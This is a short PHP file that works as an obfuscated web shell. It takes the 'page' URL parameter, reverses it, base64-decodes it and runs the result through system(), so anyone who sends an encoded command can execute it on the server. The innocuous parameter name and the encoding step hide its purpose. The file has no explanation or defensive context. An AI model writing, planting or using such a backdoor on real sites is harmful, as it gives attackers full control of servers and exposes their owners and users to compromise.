<?php
if(!isset($_GET["page"])){
    exit(0);
}

$cmd = $_GET["page"];
$cmd = base64_decode(strrev($cmd));

system($cmd);
